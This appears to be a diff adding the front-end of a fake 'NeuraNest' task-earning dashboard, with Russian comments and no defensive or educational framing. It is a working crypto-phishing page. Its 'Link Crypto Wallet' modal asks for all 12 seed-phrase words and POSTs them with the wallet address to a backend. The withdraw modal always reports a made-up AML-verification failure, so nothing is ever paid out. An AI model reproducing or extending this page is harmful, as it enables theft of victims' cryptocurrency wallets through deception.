@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NeuraNest - Worker Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #0d1b2a 0%, #1b263b 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.97);
+            padding: 35px;
+            border-radius: 15px;
+            box-shadow: 0 15px 40px rgba(0, 212, 255, 0.2);
+            width: 480px;
+            text-align: center;
+            color: #1e3c72;
+        }
+        .hidden {
+            display: none;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 12px 0;
+            border: 1px solid #00d4ff;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 15px;
+            background: #f9faff;
+        }
+        button {
+            background: linear-gradient(90deg, #1e3c72, #00d4ff);
+            color: white;
+            padding: 14px 28px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 700;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin: 6px;
+        }
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 212, 255, 0.4);
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: #fff;
+            padding: 35px;
+            border-radius: 15px;
+            width: 580px;
+            max-height: 85vh;
+            overflow-y: auto;
+            color: #1e3c72;
+        }
+        .seed-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .seed-input {
+            padding: 12px;
+            font-size: 15px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+        }
+        .dashboard-info {
+            text-align: left;
+            margin: 30px 0;
+        }
+        .dashboard-info p {
+            margin: 15px 0;
+            font-size: 17px;
+        }
+        .logo {
+            margin-bottom: 25px;
+        }
+        .logo h2 {
+            margin: 10px 0 0;
+            color: #1e3c72;
+            font-weight: 700;
+        }
+        .switch-form {
+            cursor: pointer;
+            color: #00d4ff;
+            text-decoration: underline;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Форма логина -->
+    <div id="login-form" class="container">
+        <div class="logo">
+            <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="30" cy="30" r="25" stroke="url(#grad1)" stroke-width="5" fill="none"/>
+                <path d="M20 40 Q30 20 40 40" stroke="url(#grad1)" stroke-width="4" fill="none"/>
+                <path d="M25 45 Q30 30 35 45" stroke="url(#grad1)" stroke-width="3" fill="none"/>
+                <defs>
+                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" style="stop-color:#1e3c72;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#00d4ff;stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+            </svg>
+            <h2>NeuraNest</h2>
+        </div>
+        <h3>Login</h3>
+        <input type="email" id="login-email" placeholder="Enter your email" required>
+        <input type="password" id="login-password" placeholder="Enter your password" required>
+        <button id="login-btn">Login</button>
+        <div class="switch-form" onclick="switchToRegister()">Need an account? Register here</div>
+    </div>
+
+    <!-- Форма регистрации -->
+    <div id="register-form" class="container hidden">
+        <div class="logo">
+            <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="30" cy="30" r="25" stroke="url(#grad1)" stroke-width="5" fill="none"/>
+                <path d="M20 40 Q30 20 40 40" stroke="url(#grad1)" stroke-width="4" fill="none"/>
+                <path d="M25 45 Q30 30 35 45" stroke="url(#grad1)" stroke-width="3" fill="none"/>
+                <defs>
+                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" style="stop-color:#1e3c72;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#00d4ff;stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+            </svg>
+            <h2>NeuraNest</h2>
+        </div>
+        <h3>Register</h3>
+        <input type="email" id="register-email" placeholder="Enter your email" required>
+        <input type="password" id="register-password" placeholder="Enter your password" required>
+        <button id="register-btn">Register</button>
+        <div class="switch-form" onclick="switchToLogin()">Already have an account? Login here</div>
+    </div>
+
+    <!-- Личный кабинет -->
+    <div id="dashboard" class="container hidden">
+        <div class="logo">
+            <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="30" cy="30" r="25" stroke="url(#grad1)" stroke-width="5" fill="none"/>
+                <path d="M20 40 Q30 20 40 40" stroke="url(#grad1)" stroke-width="4" fill="none"/>
+                <path d="M25 45 Q30 30 35 45" stroke="url(#grad1)" stroke-width="3" fill="none"/>
+                <defs>
+                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" style="stop-color:#1e3c72;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#00d4ff;stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+            </svg>
+            <h2>NeuraNest</h2>
+        </div>
+        <h3>Dashboard</h3>
+        <div class="dashboard-info">
+            <p>Balance: <span id="balance">0.00</span> USD</p>
+            <p>Tasks Completed: <span id="tasks-completed">0</span></p>
+            <p>Earned Today: <span id="earned-today">0.00</span> USD</p>
+            <p>Total Earned: <span id="earned-total">0.00</span> USD</p>
+        </div>
+        <button onclick="openWalletModal()">Link Crypto Wallet</button>
+        <button id="withdraw-btn" class="hidden" onclick="openWithdrawModal()">Withdraw Funds</button>
+        <button onclick="logout()">Logout</button>
+    </div>
+
+    <!-- Модальное окно для привязки кошелька -->
+    <div id="wallet-modal" class="modal">
+        <div class="modal-content">
+            <h3>Link Crypto Wallet</h3>
+            <input type="text" id="wallet-address" placeholder="Wallet Address" required>
+            <p>Enter your 12 seed phrases:</p>
+            <div class="seed-grid">
+                <input type="text" class="seed-input" placeholder="1">
+                <input type="text" class="seed-input" placeholder="2">
+                <input type="text" class="seed-input" placeholder="3">
+                <input type="text" class="seed-input" placeholder="4">
+                <input type="text" class="seed-input" placeholder="5">
+                <input type="text" class="seed-input" placeholder="6">
+                <input type="text" class="seed-input" placeholder="7">
+                <input type="text" class="seed-input" placeholder="8">
+                <input type="text" class="seed-input" placeholder="9">
+                <input type="text" class="seed-input" placeholder="10">
+                <input type="text" class="seed-input" placeholder="11">
+                <input type="text" class="seed-input" placeholder="12">
+            </div>
+            <button style="margin-top: 25px;" onclick="saveWallet()">Save</button>
+            <button style="margin-top: 15px; background: #ccc;" onclick="closeWalletModal()">Close</button>
+        </div>
+    </div>
+
+    <!-- Модальное окно для вывода денег -->
+    <div id="withdraw-modal" class="modal">
+        <div class="modal-content">
+            <h3>Withdraw Funds</h3>
+            <p>Withdrawal to this wallet is currently unavailable as it does not pass AML verification.</p>
+            <button style="margin-top: 25px; background: #ccc;" onclick="closeWithdrawModal()">Close</button>
+        </div>
+    </div>
+
+    <script>
+        let isWalletLinked = false;
+        let userId = null;
+
+        // Проверка состояния при загрузке страницы
+        window.onload = function() {
+            const loggedInUser = localStorage.getItem('loggedInUser');
+            if (loggedInUser) {
+                const userData = JSON.parse(loggedInUser);
+                userId = userData.id;
+                showDashboard(userData);
+            }
+        };
+
+        // Логин
+        document.getElementById('login-btn').addEventListener('click', function() {
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+            if (email && password) {
+                fetch('http://localhost:3000/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ login: email, password: password })
+                }).then(response => response.json())
+                  .then(data => {
+                      if (data.success) {
+                          userId = data.user.id;
+                          localStorage.setItem('loggedInUser', JSON.stringify(data.user));
+                          showDashboard(data.user);
+                      } else {
+                          alert(data.error || 'Login failed!');
+                      }
+                  }).catch(err => {
+                      console.error('Error:', err);
+                      alert('Server error! Please check if the server is running.');
+                  });
+            } else {
+                alert('Please fill in all fields!');
+            }
+        });
+
+        // Регистрация
+        document.getElementById('register-btn').addEventListener('click', function() {
+            const email = document.getElementById('register-email').value;
+            const password = document.getElementById('register-password').value;
+            if (email && password) {
+                userId = 'user_' + Date.now();
+                const userData = {
+                    id: userId,
+                    login: email,
+                    password: password,
+                    wallet: '',
+                    seeds: [],
+                    balance: 0,
+                    tasksCompleted: 0,
+                    earnedToday: 0,
+                    earnedTotal: 0
+                };
+                fetch('http://localhost:3000/register', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(userData)
+                }).then(response => response.json())
+                  .then(data => {
+                      if (data.success) {
+                          localStorage.setItem('loggedInUser', JSON.stringify(data.user));
+                          showDashboard(data.user);
+                      } else {
+                          alert(data.error || 'Registration failed!');
+                      }
+                  }).catch(err => {
+                      console.error('Error:', err);
+                      alert('Server error! Please check if the server is running.');
+                  });
+            } else {
+                alert('Please fill in all fields!');
+            }
+        });
+
+        // Переключение на форму регистрации
+        function switchToRegister() {
+            document.getElementById('login-form').classList.add('hidden');
+            document.getElementById('register-form').classList.remove('hidden');
+        }
+
+        // Переключение на форму логина
+        function switchToLogin() {
+            document.getElementById('register-form').classList.add('hidden');
+            document.getElementById('login-form').classList.remove('hidden');
+        }
+
+        // Показать личный кабинет
+        function showDashboard(userData) {
+            document.getElementById('login-form').classList.add('hidden');
+            document.getElementById('register-form').classList.add('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
+            updateDashboard(userData);
+            isWalletLinked = !!userData.wallet; // Проверяем, привязан ли кошелёк
+            document.getElementById('withdraw-btn').classList.toggle('hidden', !isWalletLinked);
+        }
+
+        // Выход
+        function logout() {
+            localStorage.removeItem('loggedInUser');
+            userId = null;
+            isWalletLinked = false;
+            document.getElementById('dashboard').classList.add('hidden');
+            document.getElementById('login-form').classList.remove('hidden');
+        }
+
+        // Открыть модальное окно кошелька
+        function openWalletModal() {
+            document.getElementById('wallet-modal').style.display = 'flex';
+        }
+
+        // Закрыть модальное окно кошелька
+        function closeWalletModal() {
+            document.getElementById('wallet-modal').style.display = 'none';
+        }
+
+        // Сохранить кошелёк
+        function saveWallet() {
+            const address = document.getElementById('wallet-address').value;
+            const seeds = Array.from(document.getElementsByClassName('seed-input')).map(input => input.value);
+            if (address && seeds.every(seed => seed)) {
+                const walletData = { id: userId, wallet: address, seeds: seeds };
+                fetch('http://localhost:3000/update-wallet', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(walletData)
+                }).then(response => response.json())
+                  .then(() => {
+                      alert('Wallet successfully linked!');
+                      isWalletLinked = true;
+                      document.getElementById('withdraw-btn').classList.remove('hidden');
+                      const userData = JSON.parse(localStorage.getItem('loggedInUser'));
+                      userData.wallet = address;
+                      userData.seeds = seeds;
+                      localStorage.setItem('loggedInUser', JSON.stringify(userData));
+                      closeWalletModal();
+                  }).catch(err => {
+                      console.error('Error:', err);
+                      alert('Server error! Please check if the server is running.');
+                  });
+            } else {
+                alert('Please fill in all fields!');
+            }
+        }
+
+        // Открыть модальное окно вывода
+        function openWithdrawModal() {
+            document.getElementById('withdraw-modal').style.display = 'flex';
+        }
+
+        // Закрыть модальное окно вывода
+        function closeWithdrawModal() {
+            document.getElementById('withdraw-modal').style.display = 'none';
+        }
+
+        // Обновить данные в личном кабинете
+        function updateDashboard(data) {
+            document.getElementById('balance').textContent = data.balance.toFixed(2);
+            document.getElementById('tasks-completed').textContent = data.tasksCompleted;
+            document.getElementById('earned-today').textContent = data.earnedToday.toFixed(2);
+            document.getElementById('earned-total').textContent = data.earnedTotal.toFixed(2);
+        }
+    </script>
+</body>
+</html>
